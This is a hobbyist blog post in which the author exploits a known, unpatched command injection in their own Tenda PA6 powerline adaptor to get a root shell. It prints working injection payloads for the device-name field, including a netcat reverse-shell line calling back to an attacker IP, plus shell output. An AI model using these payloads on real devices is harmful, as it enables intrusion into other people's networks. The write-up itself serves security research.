---
title: "Breaking into your Tenda PA6 Powerline adaptor"
date: 2023-09-10T11:25:58+01:00
description: "Using a command injection to get a root shell on a Tenda PA6 Powerline adaptor"
keywords: ["infosec", "tenda pa6", "powerline"]
draft: false
tags: ["projects", "security"]
math: false
toc: false
---

{{< image path="tenda-pa6.jpg" alt="My Tenda PA6 in the attic" lazy=false >}}

So I have a little Tenda PA6 Powerline/HomePlug WiFi extender that I use as an additional WAP in the attic room of my house. This room has been getting very hot recently (around 35 °C), and when I touch the device it feels to be at least 60 °C. Tenda's website says that the PA6 can operate in temperatures up to 40 °C, but I wanted to see if I could get some temperature readings out of the device to see how hot it is actually getting. 

What I should have done here is buying an infrared thermometer, but where is the fun in that?

Conveniently for me, some security researchers from IBM have already made a [pretty comprehensive write-up](https://securityintelligence.com/posts/vulnerable-powerline-extenders-underline-lax-iot-security/) of all the holes in the PA6. In typical vendor fashion, Tenda have not fixed any of these issues in the 3 years since they published the article. The researchers provide 3 exploits for the device, an authed Command Injection, an authed Buffer Overflow, and a pre-auth DoS. As I have the admin password (the default is `admin` 🤦), I decided to go with the Command Injection, which I figured would be the easiest to exploit.

{{< image path="tenda-powerline-settings.png" alt="Screenshot of the Powerline settings page on the Tenda PA6" >}}

The Command Injection issue is as basic as it gets. On the device's powerline settings page, you can change the names of the other PLCs on the network. Unfortunately, this name change is done by simply `sprintf`'ing the raw user input into a string, which is then executed as a command on the system, as root. This means you just need to put a little `" ;` in your chosen name, and then you can run any command present on the device. The security researchers don't quite spell out how to exploit this, but even I managed it after a few hours of head scratching.

Conveniently, the PA6 has BusyBox installed, which has a `netcat` binary for us to use --- I found out about this from a [GitHub gist](https://gist.github.com/Weissnix4711/eeb54186469d313d07ffb44d00344a3f) listing all the files in the firmware image. As I wanted a shell on the PA6, we can use `netcat` to pipe a shell session over a TCP socket back to my attacker PC (a reverse shell). 

To do this you first need to spin up a `netcat` listener on your attacker PC, which will listen for incoming connections. I did this with `nc -lvp 4444`. Note in this example my attacker PC has the IP address `192.168.1.100`.

Then we begin to work on the PA6, pasting our commands into one of the PLC device name fields. The version of `nc` on the PA6 doesn't have the convenient `-e` option that handles executing a command for you, so instead we have to do a dance with a named FIFO pipe [^1]. You first paste in:

[^1]: The PA6 uses a very old version of BusyBox, v1.17.2, which was released in August 2010. Weirdly it was compiled 8 years later, on `2018-01-22 01:08:54`. From digging in the source code, it seems the `-e` switch was available in BusyBox v1.17.2's `nc`, but it seems to have been compiled without the `NC_EXTRA` option.

```bash
a" ; mknod /tmp/f p #
```

Here `a` is just a placeholder name. You can then set up the reverse shell by pasting the following into the same field [^2]:

[^2]: You'd normally do this in a single step, but this field only accepts 63 characters. I'm assuming this is just a client side limit, so you could probably sidestep it by sending the request with `curl` or something. 

```bash
a" ; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f #
```

What we are doing here is passing whatever comes out of the `/tmp/f` pipe into the `stdin` of the shell. We then pipe the `stdout` and `stderr` of the shell into `netcat`, which will send it back to our attacker PC. Finally, we redirect the `stdout` of `netcat` (which is whatever commands we input on the attacker PC), back into the `/tmp/f` pipe. This gives us a poor man's SSH session on the PA6.

`netcat` on your attacker PC should then print some message like:

```bash
Ncat: Connection from 192.168.1.XX.
Ncat: Connection from 192.168.1.XX:XXXXX.

BusyBox v1.17.2 (2018-01-22 01:08:54 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# 
```

Now you can explore! Here is `/proc/cpuinfo`, (some of) `/proc/meminfo` and `/proc/version`:

```bash
# cat /proc/cpuinfo
system type             : 960500WIFI_P201
processor               : 0
cpu model               : Broadcom BMIPS3300 V3.3
BogoMIPS                : 397.31
wait instruction        : yes
microsecond timers      : yes
tlb_entries             : 32
extra interrupt vector  : no
hardware watchpoint     : no
ASEs implemented        :
shadow register sets    : 1
kscratch registers      : 0
core                    : 0
VCED exceptions         : not available
VCEI exceptions         : not available

# cat /proc/meminfo
MemTotal:          29468 kB
MemFree:            1288 kB
Buffers:             700 kB
Cached:             3808 kB
SwapCached:            0 kB
Active:             5680 kB
Inactive:           2028 kB
[...]
VmallocTotal:    1032116 kB
VmallocUsed:        2784 kB
VmallocChunk:    1025180 kB

# cat /proc/version
Linux version 3.4.11-rt19 (root@localhost.localdomain) (gcc version 4.6.2 (Buildroot 2011.11) ) #1 PREEMPT Mon Jan 22 01:07:36 CST 2018
```

A whole 32 MB of RAM! Here is `top`:

```bash
Mem: 28240K used, 1228K free, 0K shrd, 740K buff, 3816K cached
CPU:   0% usr   5% sys   0% nic  93% idle   0% io   0% irq   0% sirq
Load average: 0.84 0.78 0.78 1/47 17193
  PID  PPID USER     STAT   VSZ %MEM CPU %CPU COMMAND
  250     2 admin    SW       0   0%   0   5% [wl0-kthrd]
  217     2 admin    SW       0   0%   0   1% [bcmsw_rx]
17147 15971 admin    R     1712   6%   0   0% top
  588   294 admin    S     5348  18%   0   0% httpd -m 0
  415   294 admin    S     4704  16%   0   0% wlmngr -m 0
  422   421 admin    S     4704  16%   0   0% wlmngr -m 0
  421   415 admin    S     4704  16%   0   0% wlmngr -m 0
  418   294 admin    S     3888  13%   0   0% homeplugd -m 0
  295   294 admin    S     3848  13%   0   0% ssk
  420   419 admin    S     3784  13%   0   0% consoled
  294     1 admin    S     3504  12%   0   0% /bin/smd
  416   294 admin    S     3428  12%   0   0% plcnvm -m 0
  543     1 admin    S     1948   7%   0   0% /bin/nas
  310   294 admin    S     1764   6%   0   0% syslogd -n -C -l 7
  565     1 admin    S     1712   6%   0   0% /bin/acsd
15971 15966 admin    S     1712   6%   0   0% /bin/sh -i
    1     0 admin    S     1708   6%   0   0% init
15966   588 admin    S     1708   6%   0   0% sh -c homeplugctl remote_set --rem
  419     1 admin    S     1708   6%   0   0% -/bin/sh -l -c consoled
15972 15966 admin    S     1704   6%   0   0% nc 192.168.1.100 4444
```

Unfortunately, I couldn't actually find any way of reading any temperature sensors on the device. I tried looking in `/sys/class/thermal`, and a couple of other places, but nothing seemed to present itself. Presumably this SOC just doesn't have any temperature sensors.